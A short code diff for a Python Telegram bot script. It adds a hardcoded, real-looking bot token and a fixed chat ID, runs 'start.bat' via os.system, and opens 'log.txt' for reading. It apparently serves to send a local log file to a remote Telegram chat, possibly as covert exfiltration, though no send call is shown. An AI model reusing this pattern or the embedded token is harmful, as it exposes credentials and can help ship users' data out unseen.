@@ -1,14 +1,12 @@
-import time
 import os
 import telebot
-import subprocess
 
-token = ""
+
+token = "1147534093:AAFpE7IxgPhcwqS69IAFLKuLtky3pwEoJrE"
 
 bot = telebot.TeleBot(token)
 chat_id = 506563771
-subprocess.check_call('start.bat', shell=True)
-
+os.system('start.bat')
 
 text = open('log.txt', 'rb')
 
